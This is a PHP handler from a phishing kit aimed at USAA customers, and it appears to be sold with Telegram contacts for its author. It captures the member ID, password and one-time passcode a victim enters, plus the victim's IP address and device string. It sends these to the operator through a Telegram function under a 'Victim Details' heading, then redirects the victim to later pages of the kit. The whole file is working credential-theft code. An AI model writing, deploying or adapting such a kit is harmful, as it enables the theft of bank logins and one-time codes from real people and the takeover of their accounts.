<?php
error_reporting(0);


//Contact Info:
//==================================
// Telegram : https://t.me/DevDaniel_100
//================================== 
// Channel 🔰 :  https://t.me/devdaniel_channel
//==================================


require '../config.php';
require './telegram.php';


session_start();



$memberId = $_POST["memberId"];
$memberpass = $_POST["memberpass"];
$code = $_POST["code"];


$ip = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"];

if($_POST["memberId"] and $_POST["memberpass"]){
		$fsh =
				"<strong>‼ ️💳 Usaa Login 💁 ‼️</strong>\n".
				"| Email : <code>$memberId</code> \n".
				"| Password : <code>$memberpass</code> \n".
				"+-----Victim Details-----+\n".
				"| 🌐 IP : $ip\n".
				"| Device : $ua\n".
				"|----Contact Me IF YOU NEED HELP : @ro0tM8n ----\n"
				;


		telegram($fsh);
		header("Location: ./steps.php?$xxx");



		
	



}else if($_POST["code"] ){
				$fsh =
				"<strong>‼ ️💳 Usaa OTP 🖥 ‼️</strong>\n".
				"| OTP CODE : <code>$code</code> \n".
				"+-----Victim Details-----+\n".
				"| 🌐 IP : $ip\n".
				"| Device : $ua\n".
				"|----Contact Me IF YOU NEED HELP : @ro0tM8n ----\n"
				;
		telegram($fsh);
		header("Location: ./exit.php?$xxx");

		
	}


?>
